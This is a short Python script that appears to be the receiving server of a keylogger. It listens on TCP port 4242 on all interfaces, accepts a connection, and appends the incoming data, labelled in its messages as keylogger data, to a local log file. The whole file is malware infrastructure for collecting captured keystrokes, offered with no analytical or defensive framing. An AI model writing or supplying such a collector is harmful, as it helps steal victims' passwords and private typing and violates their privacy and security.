import socket

def create_socket():

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.bind(('0.0.0.0', 4242))
	sock.listen(5)
	return sock


def write_logs(data):
	
	with open("log.txt", "a") as f:
		f.write(data)

def handle_keyloger():
	
	print("Listening for incoming connections")
	listener = create_socket()
	connection, address = listener.accept()
	print("Got a connection from: " + str(address[0]) + ":" + str(address[1]))
	
	loop = True
	while loop:
		received_data = connection.recv(1024)
		if not received_data:
			loop = False
		else:
			print("Writing Keylogger data")
			write_logs(received_data.decode())
	
	print("Closing active connection.")
	listener.close()

handle_keyloger()